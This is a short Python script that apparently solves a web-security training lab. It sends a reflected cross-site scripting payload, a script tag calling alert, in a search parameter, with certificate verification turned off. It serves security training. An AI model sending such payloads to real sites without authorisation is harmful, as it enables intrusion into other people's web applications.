from web_security_academy.core.utils import *

import requests


def solve_lab(url, proxies):
    params = {"search": "<script>alert(1)</script>"}
    print_info(
        f'Performing reflected XSS attack by visiting "{url}" with the following parameters:'
    )
    print(params)

    requests.get(url, params=params, proxies=proxies, verify=False)
    print_success("Reflected XSS attack performed.\n")
